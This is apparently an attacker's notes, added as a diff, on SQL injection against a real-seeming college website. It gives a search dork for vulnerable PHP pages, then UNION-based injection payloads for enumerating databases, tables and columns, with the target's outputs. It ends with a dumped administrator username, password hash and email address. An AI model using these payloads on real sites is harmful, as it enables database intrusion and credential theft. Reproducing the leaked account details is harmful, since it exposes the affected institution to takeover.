@@ -1,0 +1,49 @@
+DORK - inurl:.php?id= site:.pk
+
+
+
+
+What is SQL Injection ?
+
+SQL injection is a code injection technique that might destroy your database.
+SQL injection is one of the most common web hacking techniques.
+
+
+Types of SQL injection
+
+1.Error Based - ' 
+2.Union Based - '
+3.Blind Based - ' AND 1=1,OR 1=1
+
+
+user - user() [cptctvpm_poly_user@localhost]
+database version - version() [10.6.13-MariaDB]
+
+To check SQLi - [',"]
+
+To Balance url - [--+,--+-]
+
+To find Columns - [ORDER+BY+1] - we got 10 columns
+
+To find Vulnerable columns - [UNION+SELECT+1,2,3,4,5,6,7,8,9,10]
+
+To find hidden Vulnerable columns - [AND+0+]
+
+To find all databases - (SELECT+GROUP_CONCAT(schema_name)+FROM+INFORMATION_SCHEMA.SCHEMATA) - [information_schema,cptctvpm_polytech_new]
+
+To find tables name - (SELECT+GROUP_CONCAT(table_name)+FROM+INFORMATION_SCHEMA.TABLES)
+
+To find tables name from website database - (SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE())      
+table name - [cpt_admin]
+
+To find columns name - (SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x6370745f61646d696e+AND+TABLE_SCHEMA=DATABASE())
+column name - [username,password,email_id]
+
+
+To dump data - (SELECT+GROUP_CONCAT(username,password,email_id+SEPARATOR+0x3c62723e)+FROM+cpt_admin)
+
+To dump data from other database - (SELECT+GROUP_CONCAT(username,password,email_id+SEPARATOR+0x3c62723e)+FROM+[database_name].cpt_admin)
+
+username - super@Cptcadmin
+password - cddbc321b8dfbd0a4145695631925d69
+email - superadmin@cptc.ac.in
